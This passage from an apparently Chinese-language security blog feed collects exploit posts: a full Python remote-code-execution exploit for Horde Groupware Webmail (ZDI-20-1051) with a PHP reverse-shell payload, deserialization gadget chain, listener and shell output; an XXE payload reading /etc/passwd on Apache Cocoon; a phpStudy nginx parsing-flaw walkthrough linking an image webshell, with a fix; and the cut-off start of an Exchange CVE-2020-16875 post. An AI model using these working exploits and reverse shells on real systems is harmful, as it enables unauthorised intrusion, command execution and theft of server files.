class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Horde Groupware Webmail Edition Sort sortpref Deserialization of Untrusted Data Remote Code Execution Vulnerability</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Identifiers: ZDI-CAN-10436 / ZDI-20-1051</span></span><br><span class="line"><span class="string">Found by ..: mr_me</span></span><br><span class="line"><span class="string">Tested on .: Horde Groupware Webmail 5.2.22 (pear installation) on Debian 9 Stretch w/ Apache/2.4.25 &amp; PHP 7.0.33</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Summary:</span></span><br><span class="line"><span class="string">========</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">It&#x27;s possible to reach a deserialization of untrusted data vulnerability within the constructor of the IMP_Prefs_Sort class. A low privileged authenticated attacker can leverage this to achieve remote code execution.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Example:</span></span><br><span class="line"><span class="string">========</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">saturn:~ mr_me$ ./poc.py </span></span><br><span class="line"><span class="string">(+) usage ./poc.py &lt;target&gt; &lt;path&gt; &lt;user:pass&gt; &lt;connectback:port&gt;</span></span><br><span class="line"><span class="string">(+) eg: ./poc.py 172.16.175.148 /horde/ hordeuser:pass123 172.16.175.1:1337</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">saturn:~ mr_me$ ./poc.py 172.16.175.148 /horde/ hordeuser:pass123 172.16.175.1:1337</span></span><br><span class="line"><span class="string">(+) targeting http://172.16.175.145/horde/</span></span><br><span class="line"><span class="string">(+) obtained session iefankvohbl8og0mtaadm3efb6</span></span><br><span class="line"><span class="string">(+) inserted our php object</span></span><br><span class="line"><span class="string">(+) triggering deserialization...</span></span><br><span class="line"><span class="string">(+) starting handler on port 1337</span></span><br><span class="line"><span class="string">(+) connection from 172.16.175.145</span></span><br><span class="line"><span class="string">(+) pop thy shell!</span></span><br><span class="line"><span class="string">id</span></span><br><span class="line"><span class="string">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></span><br><span class="line"><span class="string">pwd</span></span><br><span class="line"><span class="string">/var/www/horde/services</span></span><br><span class="line"><span class="string">uname -a</span></span><br><span class="line"><span class="string">Linux target 4.9.0-11-amd64 #1 SMP Debian 4.9.189-3+deb9u1 (2019-09-20) x86_64 GNU/Linux</span></span><br><span class="line"><span class="string">exit</span></span><br><span class="line"><span class="string">*** Connection closed by remote host ***</span></span><br><span class="line"><span class="string">(+) repaired the target!</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> telnetlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rs</span>(<span class="params">cbh, cbp</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;&quot;@error_reporting(-1);</span></span><br><span class="line"><span class="string">@set_time_limit(0); </span></span><br><span class="line"><span class="string">@ignore_user_abort(1);</span></span><br><span class="line"><span class="string">$dis=@ini_get(&#x27;disable_functions&#x27;);</span></span><br><span class="line"><span class="string">if(!empty($dis))&#123;</span></span><br><span class="line"><span class="string">    $dis=preg_replace(&#x27;/[, ]+/&#x27;, &#x27;,&#x27;, $dis);</span></span><br><span class="line"><span class="string">    $dis=explode(&#x27;,&#x27;, $dis);</span></span><br><span class="line"><span class="string">    $dis=array_map(&#x27;trim&#x27;, $dis);</span></span><br><span class="line"><span class="string">&#125;else&#123;</span></span><br><span class="line"><span class="string">    $dis=array();</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">$ipaddr=&#x27;%s&#x27;;</span></span><br><span class="line"><span class="string">$port=%d;</span></span><br><span class="line"><span class="string">function PtdSlhY($c)&#123;</span></span><br><span class="line"><span class="string">    global $dis; </span></span><br><span class="line"><span class="string">    if (FALSE !== strpos(strtolower(PHP_OS), &#x27;win&#x27; )) &#123;</span></span><br><span class="line"><span class="string">        $c=$c.&quot; 2&gt;&amp;1\\n&quot;;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    ob_start();</span></span><br><span class="line"><span class="string">    system($c);</span></span><br><span class="line"><span class="string">    $o=ob_get_contents();</span></span><br><span class="line"><span class="string">    ob_end_clean();</span></span><br><span class="line"><span class="string">    if (strlen($o) === 0)&#123;</span></span><br><span class="line"><span class="string">        $o = &quot;NULL&quot;;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    return $o;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">$nofuncs=&#x27;no exec functions&#x27;;</span></span><br><span class="line"><span class="string">$s=@fsockopen(&quot;tcp://$ipaddr&quot;,$port);</span></span><br><span class="line"><span class="string">while($c=fread($s,2048))&#123;</span></span><br><span class="line"><span class="string">    $out = &#x27;&#x27;;</span></span><br><span class="line"><span class="string">    if(substr($c,0,3) == &#x27;cd &#x27;)&#123;</span></span><br><span class="line"><span class="string">        chdir(substr($c,3,-1));</span></span><br><span class="line"><span class="string">    &#125;else if (substr($c,0,4) == &#x27;quit&#x27; || substr($c,0,4) == &#x27;exit&#x27;) &#123;</span></span><br><span class="line"><span class="string">        break;</span></span><br><span class="line"><span class="string">    &#125;else&#123;</span></span><br><span class="line"><span class="string">        $out=PtdSlhY(substr($c,0,-1));</span></span><br><span class="line"><span class="string">        if($out===false)&#123;</span></span><br><span class="line"><span class="string">            fwrite($s, $nofuncs);</span></span><br><span class="line"><span class="string">            break;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    fwrite($s,$out);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">fclose($s);&quot;&quot;&quot;</span> % (cbh, cbp)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_session</span>(<span class="params">t, p, usr, pwd</span>):</span></span><br><span class="line">    uri = <span class="string">&quot;http://%s%slogin.php&quot;</span> % (t, p)</span><br><span class="line">    p = &#123;</span><br><span class="line">        <span class="string">&quot;login_post&quot;</span> : <span class="number">1337</span>,</span><br><span class="line">        <span class="string">&quot;horde_user&quot;</span> : usr,</span><br><span class="line">        <span class="string">&quot;horde_pass&quot;</span> : pwd</span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.post(uri, data=p, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">    match = re.findall(<span class="string">&quot;Horde=(.&#123;26&#125;);&quot;</span>, r.headers[<span class="string">&#x27;set-cookie&#x27;</span>])</span><br><span class="line">    <span class="keyword">assert</span> len(match) == <span class="number">2</span>, <span class="string">&quot;(-) failed to login&quot;</span></span><br><span class="line">    <span class="keyword">return</span> match[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trigger_deserialization</span>(<span class="params">t, p, s, host, port</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot; Object instantiation to reach the deserialization &quot;&quot;&quot;</span></span><br><span class="line">    handlerthr = Thread(target=handler, args=(port,))</span><br><span class="line">    handlerthr.start()</span><br><span class="line">    uri = <span class="string">&quot;http://%s%sservices/ajax.php/imp/imple&quot;</span> % (t, p)</span><br><span class="line">    p = &#123;</span><br><span class="line">        <span class="string">&quot;imple&quot;</span> : <span class="string">&quot;IMP_Prefs_Sort&quot;</span>,</span><br><span class="line">        <span class="string">&quot;app&quot;</span> : <span class="string">&quot;imp&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    h = &#123; <span class="string">&quot;cmd&quot;</span> : base64.b64encode(rs(host, port).encode()) &#125;</span><br><span class="line">    c = &#123; <span class="string">&quot;Horde&quot;</span> : s &#125;</span><br><span class="line">    r = requests.get(uri, params=p, cookies=c, headers=h)</span><br><span class="line">    match = re.search(<span class="string">&quot;horde_logout_token=(.*)&amp;&quot;</span>, r.text)</span><br><span class="line">    <span class="keyword">assert</span> match, <span class="string">&quot;(-) failed to leak the horde_logout_token!&quot;</span></span><br><span class="line">    p[<span class="string">&#x27;token&#x27;</span>] = match.group(<span class="number">1</span>)</span><br><span class="line">    r = requests.get(uri, params=p, cookies=c, headers=h)</span><br><span class="line">    <span class="keyword">assert</span> r.status_code == <span class="number">200</span>, <span class="string">&quot;(-) failed to trigger deserialization!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_pop</span>():</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot; An updated pop chain &quot;&quot;&quot;</span></span><br><span class="line">    pop  = <span class="string">&#x27;O:34:&quot;Horde_Kolab_Server_Decorator_Clean&quot;:2:&#123;&#x27;</span></span><br><span class="line">    pop += <span class="string">&#x27;S:43:&quot;\\00Horde_Kolab_Server_Decorator_Clean\\00_server&quot;;O:20:&quot;Horde_Prefs_Identity&quot;:3:&#123;&#x27;</span></span><br><span class="line">    pop += <span class="string">&#x27;S:9:&quot;\\00*\\00_prefs&quot;;O:11:&quot;Horde_Prefs&quot;:2:&#123;&#x27;</span></span><br><span class="line">    pop += <span class="string">&#x27;S:8:&quot;\\00*\\00_opts&quot;;a:1:&#123;&#x27;</span></span><br><span class="line">    pop += <span class="string">&#x27;s:12:&quot;sizecallback&quot;;a:2:&#123;i:0;O:12:&quot;Horde_Config&quot;:1:&#123;&#x27;</span></span><br><span class="line">    pop += <span class="string">&#x27;S:13:&quot;\\00*\\00_oldConfig&quot;;s:44:&quot;eval(base64_decode($_SERVER[HTTP_CMD]));die;&quot;;&#x27;</span></span><br><span class="line">    pop += <span class="string">&#x27;&#125;i:1;s:13:&quot;readXMLConfig&quot;;&#125;&#125;&#x27;</span></span><br><span class="line">    pop += <span class="string">&#x27;S:10:&quot;\\00*\\00_scopes&quot;;a:1:&#123;&#x27;</span></span><br><span class="line">    pop += <span class="string">&#x27;s:5:&quot;horde&quot;;C:17:&quot;Horde_Prefs_Scope&quot;:10:&#123;[null,[1]]&#125;&#125;&#125;&#x27;</span>  <span class="comment"># implements Serializable using custom unserialize/serialize</span></span><br><span class="line">    pop += <span class="string">&#x27;S:13:&quot;\\00*\\00_prefnames&quot;;a:1:&#123;s:10:&quot;identities&quot;;i:0;&#125;&#x27;</span></span><br><span class="line">    pop += <span class="string">&#x27;S:14:&quot;\\00*\\00_identities&quot;;a:1:&#123;i:0;i:0;&#125;&#125;&#x27;</span>             <span class="comment"># additional checks</span></span><br><span class="line">    pop += <span class="string">&#x27;S:42:&quot;\\00Horde_Kolab_Server_Decorator_Clean\\00_added&quot;;a:1:&#123;i:0;i:0;&#125;&#125;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> pop</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_patch</span>():</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot; Our original array &quot;&quot;&quot;</span></span><br><span class="line">    patch  = <span class="string">&#x27;a:1:&#123;&#x27;</span></span><br><span class="line">    patch += <span class="string">&#x27;s:5:&quot;INBOX&quot;;a:1:&#123;&#x27;</span></span><br><span class="line">    patch += <span class="string">&#x27;s:1:&quot;b&quot;;i:6;&#x27;</span></span><br><span class="line">    patch += <span class="string">&#x27;&#125;&#125;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> patch</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_pref</span>(<span class="params">t, p, s, k, o</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot; A primitive that inserts a string into the database &quot;&quot;&quot;</span></span><br><span class="line">    uri = <span class="string">&quot;http://%s%sservices/ajax.php/imp/setPrefValue&quot;</span> % (t, p)</span><br><span class="line">    p = &#123;</span><br><span class="line">        <span class="string">&quot;pref&quot;</span> : k,</span><br><span class="line">        <span class="string">&quot;value&quot;</span> : o,</span><br><span class="line">    &#125;</span><br><span class="line">    c = &#123; <span class="string">&quot;Horde&quot;</span> : s &#125;</span><br><span class="line">    r = requests.get(uri, params=p, cookies=c)</span><br><span class="line">    match = re.search(<span class="string">&quot;horde_logout_token=(.*)&amp;&quot;</span>, r.text)</span><br><span class="line">    <span class="keyword">assert</span> match, <span class="string">&quot;(-) failed to leak the horde_logout_token!&quot;</span></span><br><span class="line">    p[<span class="string">&#x27;token&#x27;</span>] = match.group(<span class="number">1</span>)</span><br><span class="line">    r = requests.get(uri, params=p, cookies=c)</span><br><span class="line">    <span class="keyword">assert</span> (<span class="string">&quot;\&quot;response\&quot;:true&quot;</span> <span class="keyword">in</span> r.text <span class="keyword">and</span> r.status_code == <span class="number">200</span>), <span class="string">&quot;(-) failed to set the preference!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handler</span>(<span class="params">lport</span>):</span></span><br><span class="line">    print(<span class="string">&quot;(+) starting handler on port %d&quot;</span> % lport)</span><br><span class="line">    t = telnetlib.Telnet()</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.bind((<span class="string">&quot;0.0.0.0&quot;</span>, lport))</span><br><span class="line">    s.listen(<span class="number">1</span>)</span><br><span class="line">    conn, addr = s.accept()</span><br><span class="line">    print(<span class="string">&quot;(+) connection from %s&quot;</span> % addr[<span class="number">0</span>])</span><br><span class="line">    t.sock = conn</span><br><span class="line">    print(<span class="string">&quot;(+) pop thy shell!&quot;</span>)</span><br><span class="line">    t.interact()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fix_path</span>(<span class="params">p</span>):</span></span><br><span class="line">    <span class="keyword">if</span> p == <span class="string">&quot;/&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> p</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> p.startswith(<span class="string">&quot;/&quot;</span>):</span><br><span class="line">        p = <span class="string">&quot;/%s&quot;</span> % p</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> p.endswith(<span class="string">&quot;/&quot;</span>):</span><br><span class="line">        p = <span class="string">&quot;%s/&quot;</span> % p</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &lt; <span class="number">5</span>:</span><br><span class="line">        print(<span class="string">&quot;(+) usage %s &lt;target&gt; &lt;path&gt; &lt;user:pass&gt; &lt;connectback:port&gt;&quot;</span> % sys.argv[<span class="number">0</span>])</span><br><span class="line">        print(<span class="string">&quot;(+) eg: %s 172.16.175.148 /horde/ hordeuser:pass123 172.16.175.1:1337&quot;</span> % sys.argv[<span class="number">0</span>])</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    target = sys.argv[<span class="number">1</span>]</span><br><span class="line">    path   = fix_path(sys.argv[<span class="number">2</span>])</span><br><span class="line">    user   = sys.argv[<span class="number">3</span>].split(<span class="string">&quot;:&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">    pswd   = sys.argv[<span class="number">3</span>].split(<span class="string">&quot;:&quot;</span>)[<span class="number">1</span>]</span><br><span class="line">    host   = sys.argv[<span class="number">4</span>].split(<span class="string">&quot;:&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">    port   = int(sys.argv[<span class="number">4</span>].split(<span class="string">&quot;:&quot;</span>)[<span class="number">1</span>])</span><br><span class="line">    print(<span class="string">&quot;(+) targeting http://%s%s&quot;</span> % (target, path))</span><br><span class="line">    session = get_session(target, path, user, pswd)</span><br><span class="line">    print(<span class="string">&quot;(+) obtained session %s&quot;</span> % session)</span><br><span class="line">    set_pref(target, path, session, <span class="string">&#x27;sortpref&#x27;</span>, get_pop())</span><br><span class="line">    print(<span class="string">&quot;(+) inserted our php object&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;(+) triggering deserialization...&quot;</span>)</span><br><span class="line">    trigger_deserialization(target, path, session, host, port)</span><br><span class="line">    set_pref(target, path, session, <span class="string">&#x27;sortpref&#x27;</span>, get_patch())</span><br><span class="line">    print(<span class="string">&quot;(+) repaired the target!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">saturn:~$.&#x2F;poc.py 172.16.175.148&#x2F;horde&#x2F; hordeuser:pass123 172.16.175.145</span><br><span class="line"></span><br><span class="line">(+) targeting http:&#x2F;&#x2F;172.16.175.145&#x2F;horde&#x2F;</span><br><span class="line"></span><br><span class="line">(+) obtained session iefankvohbl8og0mtaadm3efb6</span><br><span class="line"></span><br><span class="line">(+) inserted our php object</span><br><span class="line"></span><br><span class="line">(+) triggering deserialization...</span><br><span class="line"></span><br><span class="line">(+) starting handler on port 1337</span><br><span class="line"></span><br><span class="line">(+) connection from 172.16.175.145</span><br><span class="line"></span><br><span class="line">(+) pop thy shell!</span><br><span class="line"></span><br><span class="line">id</span><br><span class="line"></span><br><span class="line">uid&#x3D;33(www-data) gid&#x3D;33(www-data) groups&#x3D;33(www-data)</span><br><span class="line"></span><br><span class="line">pwd</span><br><span class="line"></span><br><span class="line">&#x2F;var&#x2F;www&#x2F;horde&#x2F;services</span><br></pre></td></tr></table></figure><p>参考链接：<a href="https://srcincite.io/pocs/zdi-20-1051.py.txt">https://srcincite.io/pocs/zdi-20-1051.py.txt</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Python Exp：&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://www.ol4three.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Horde Groupware Webmail Edition" scheme="http://www.ol4three.com/tags/Horde-Groupware-Webmail-Edition/"/>
    
  </entry>
  
  <entry>
    <title>Apache Cocoon XML注入 (CVE-2020-11991)</title>
    <link href="http://www.ol4three.com/2020/09/14/WEB/Exploit/Apache-Cocoon-XML%E6%B3%A8%E5%85%A5-CVE-2020-11991/"/>
    <id>http://www.ol4three.com/2020/09/14/WEB/Exploit/Apache-Cocoon-XML%E6%B3%A8%E5%85%A5-CVE-2020-11991/</id>
    <published>2020-09-14T06:56:41.000Z</published>
    <updated>2020-12-01T12:13:44.720Z</updated>
    
    <content type="html"><![CDATA[<p>程序使用了StreamGenerator这个方法时,解析从外部请求的xml数据包未做相关的限制,恶意用户就可以构造任意的xml表达式,使服务器解析达到XML注入的安全问题。</p><p>1、漏洞利用条件有限必须是apacheCocoon且使用了StreamGenerator,也就是说只要传输的数据被解析就可以实现了。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--?xml version=&quot;1.0&quot; ?--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">replace</span> [<span class="meta">&lt;!ENTITY <span class="meta-keyword">ent</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">userInfo</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">firstName</span>&gt;</span>John<span class="tag">&lt;/<span class="name">firstName</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">lastName</span>&gt;</span><span class="symbol">&amp;ent;</span><span class="tag">&lt;/<span class="name">lastName</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">userInfo</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200914145811723.png" alt="image-20200914145811723"></p><p>参考链接：<a href="http://mail-archives.apache.org/mod_mbox/cocoon-users/202009.mbox/author">http://mail-archives.apache.org/mod_mbox/cocoon-users/202009.mbox/author</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;程序使用了StreamGenerator这个方法时,解析从外部请求的xml数据包未做相关的限制,恶意用户就可以构造任意的xml表达式,使服务器解析达到XML注入的安全问题。&lt;/p&gt;
&lt;p&gt;1、漏洞利用条件有限必须是apacheCocoon且使用了StreamGenerato
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://www.ol4three.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Apache-Cocoon-XML" scheme="http://www.ol4three.com/tags/Apache-Cocoon-XML/"/>
    
  </entry>
  
  <entry>
    <title>phpStudy(小皮面板)v8.1.0.7 nginx 解析漏洞</title>
    <link href="http://www.ol4three.com/2020/09/14/WEB/Exploit/phpStudy-%E5%B0%8F%E7%9A%AE%E9%9D%A2%E6%9D%BF-v8-1-0-7-nginx-%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/"/>
    <id>http://www.ol4three.com/2020/09/14/WEB/Exploit/phpStudy-%E5%B0%8F%E7%9A%AE%E9%9D%A2%E6%9D%BF-v8-1-0-7-nginx-%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/</id>
    <published>2020-09-14T06:40:26.000Z</published>
    <updated>2020-12-01T12:15:18.167Z</updated>
    
    <content type="html"><![CDATA[<p><strong>一、**</strong>phpStudy<strong>**(小皮面板)简介：</strong><br><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/thum-09361599060261.png" alt="phpStudy v8.1.0.7.png"></p><p>phpStudy国内12年老牌公益软件，集安全，高效，功能与一体，已获得全球用户认可安装，运维也高效。支持一键LAMP,LNMP,集群,监控,网站,FTP,数据库,JAVA等100多项服务器管理功能。</p><p><strong>二、漏洞简介：</strong></p><p>小皮面板 &lt;= 8.1.0.7: 啊这</p><p>其实这个漏洞确实不是小皮的问题,而是2017年就出现的nginx解析漏洞。</p><p><strong>漏洞原理**</strong>：**</p><p><strong>1、由于错误配置(但是测试的时候是安装完后的默认配置，我在官方论坛也反馈了，他们还狡辩。。。)导致nginx把以.php结尾的文件交给fastcgi处理,为此可以构造<a href="http://www.xxx.com/test.gif/xx.php">http://www.xxx.com/test.gif/xx.php</a> (任何服务器端不存在的php文件均可,比如a.php)</strong></p><p>2、但是fastcgi在处理xx.php文件时发现文件并不存在,这时php.ini配置文件中cgi.fix_pathinfo=1 发挥作用,这项配置用于修复路径,如果当前路径不存在则采用上层路径。为此这里交由fastcgi处理的文件就变成了/test.gif。</p><p>3、 最重要的一点是php-fpm.conf中的security.limit_extensions配置项限制了fastcgi解析文件的类型(即指定什么类型的文件当做代码解析),此项设置为空的时候才允许fastcgi将.png等文件当做代码解析。<br>localhost_80.conf原始配置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">location ~ \.php(.*)$ &#123;</span><br><span class="line">            fastcgi_pass   127.0.0.1:9000;</span><br><span class="line">            fastcgi_index  index.php;</span><br><span class="line">            fastcgi_split_path_info  ^((?U).+\.php)(&#x2F;?.+)$;</span><br><span class="line">            fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;</span><br><span class="line">            fastcgi_param  PATH_INFO  $fastcgi_path_info;</span><br><span class="line">            fastcgi_param  PATH_TRANSLATED  $document_root$fastcgi_path_info;</span><br><span class="line">            include        fastcgi_params;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>三、漏洞复现：</p><p>测试环境：phpStudy(小皮面板)8.1.0.7 + 图片马（一定要注意不是那种copy的马子 有几率失败，可以下载这个<a href="https://github.com/tennc/webshell/blob/master/php/img/bypass-imagecreatefromgif-pass-00.gif">马子</a>测试）<br>复现如图：<br><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/thum-1f0c1599060262.png" alt="bug_7.3.png"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/thum-b8361599060262.png" alt="bug.png"></p><p>执行系统命令：<br><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/thum-34661599060543.png" alt="exec.png"><br>四、修复<br>php.ini 中 fix_pathinfo 禁用为0<br>cgi.fix_pathinfo=0</p><p>nginx.conf添加如下代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">location ~ \.php(.*)$ &#123;</span><br><span class="line">      if ( $fastcgi_script_name ~ \..*\&#x2F;.*php )&#123;</span><br><span class="line">        return 403;</span><br><span class="line">      &#125;</span><br><span class="line">    </span><br><span class="line">            fastcgi_pass   127.0.0.1:9000;</span><br><span class="line">            fastcgi_index  index.php;</span><br><span class="line">            fastcgi_split_path_info  ^((?U).+\.php)(&#x2F;?.+)$;</span><br><span class="line">            fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;</span><br><span class="line">            fastcgi_param  PATH_INFO  $fastcgi_path_info;</span><br><span class="line">            fastcgi_param  PATH_TRANSLATED  $document_root$fastcgi_path_info;</span><br><span class="line">            include        fastcgi_params;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><blockquote><p>参考链接：<a href="https://mrxn.net/news/675.html">https://mrxn.net/news/675.html</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;一、**&lt;/strong&gt;phpStudy&lt;strong&gt;**(小皮面板)简介：&lt;/strong&gt;&lt;br&gt;&lt;img src=&quot;https://oss-map.oss-cn-beijing.aliyuncs.com/img/thum-0936159906026
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://www.ol4three.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="PhpStudy" scheme="http://www.ol4three.com/tags/PhpStudy/"/>
    
      <category term="nginx解析漏洞" scheme="http://www.ol4three.com/tags/nginx%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2020-16875: Exchange Server 远程代码执行漏洞</title>
    <link href="http://www.ol4three.com/2020/09/14/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/Exploit/CVE-2020-16875-Exchange-Server-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
    <id>http://www.ol4three.com/2020/09/14/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/Exploit/CVE-2020-16875-Exchange-Server-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</id>
    <published>2020-09-14T06:33:38.000Z</published>
    <updated>2020-09-14T06:38:10.000Z</updated>
    
    <content type="html"><![CDATA[<p><em>更新公告:<a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-16875">https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-16875</a></em></p><p>微软公告说的很明显,只需要一个Exchange用户账号。就能在Exchange服务器上执行任意命令。</p><p><a href="https://srcincite.io/pocs/cve-2020-16875.py.txt">https://srcincite.io/pocs/cve-2020-16875.py.txt</a></p><p><a href="https://srcincite.io/pocs/cve-2020-16875.ps1.txt">https://srcincite.io/pocs/cve-2020-16875.ps1.txt</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">researcher@incite:~$ .&#x2F;poc.py</span><br><span class="line">(+) usage: .&#x2F;poc.py &lt;target&gt; &lt;user:pass&gt; &lt;cmd&gt;</span><br><span class="line">(+) eg: .&#x2F;poc.py 